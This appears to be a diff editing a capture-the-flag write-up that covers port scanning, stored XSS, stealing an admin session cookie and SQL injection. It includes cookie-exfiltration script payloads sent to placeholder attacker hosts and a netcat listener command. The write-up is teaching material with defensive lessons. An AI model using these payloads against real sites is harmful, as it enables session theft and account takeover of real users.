@@ -32,7 +32,7 @@ backup script moves laterally to a second user, and that user's membership in th
 Initial `nmap` scan for open ports and services:
 
 ```bash
-nmap -sC -sV -oN nmap/initial TARGET_IP
+nmap -sC -sV TARGET_IP
 ```
 
 With the web service identified, directory brute-forcing with `ffuf` using the
@@ -48,8 +48,8 @@ application's own functionality.
 ## 2. Account Registration & Stored XSS
 
 Registered a new account (`admin:admin`) and explored the app. The core feature
-is creating listings ("announcements"). Testing the listing body for script
-injection with a simple proof-of-concept payload:
+is creating listings for items. Testing the listing body for script injection
+with a simple proof-of-concept payload:
 
 ```html
 <script>alert(1)</script>
@@ -73,25 +73,19 @@ I replaced the PoC with a cookie-exfiltration payload that sends the reviewer's
 cookies to my listener:
 
 ```html
-<script>
-  new Image().src = "http://ATTACKER_IP:PORT/?c=" + document.cookie;
-</script>
+<script>fetch('http://YOUR_IP:8000/?c=' + document.cookie)</script>
 ```
 
 Started a listener, created a listing with the payload, and reported it:
 
 ```bash
 # listener to catch the request containing the cookie
-python3 -m http.server PORT
+nc -lvnp 8000
 ```
 
 Within the review interval, the admin's session cookie landed on my listener.
 Swapping my own cookie for the stolen one in the browser logged me in **as the
 admin**. The admin panel contained the **first flag**.
-
-> Note: the app explicitly blocks `alert()`-style popups in employee browsers
-> (visible later in the DB messages), so a non-interactive exfil payload like the
-> `Image()` request above is the reliable approach — not an `alert`.
 
 **Lesson:** Session cookies protecting privileged accounts must be `HttpOnly`
 (unreadable by JavaScript). A single stored XSS + an admin who views user content
@@ -126,10 +120,6 @@ password** that had been auto-generated for a user:
  changed. You have been generated a new temporary password.
  Your new password is: @b_************"
 ```
-
-(The same message dump also revealed *why* popups fail against staff: employee
-browsers block `alert` boxes — confirming the choice of a silent XSS payload in
-step 3.)
 
 **Lesson:** Never transmit credentials in plaintext through in-app messaging, and
 never trust "internal only" channels to stay private — a single SQLi exposes all
